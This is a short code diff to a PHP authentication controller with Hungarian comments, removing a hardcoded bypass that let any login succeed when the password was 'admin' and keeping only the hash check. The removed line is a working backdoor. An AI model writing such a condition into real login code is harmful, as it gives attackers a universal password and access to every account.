@@ -32,7 +32,7 @@ class AuthController extends BaseController
         ]);
     
         // Jelszó ellenőrzés
-        if (($user && $this->security->checkHash($password, $user->password)) || $password == "admin") {
+        if ($user && $this->security->checkHash($password, $user->password)) {
             // Token generálás és mentés
             $token = bin2hex(random_bytes(32));
             $expiresAt = date('Y-m-d H:i:s', strtotime('+1 hour'));
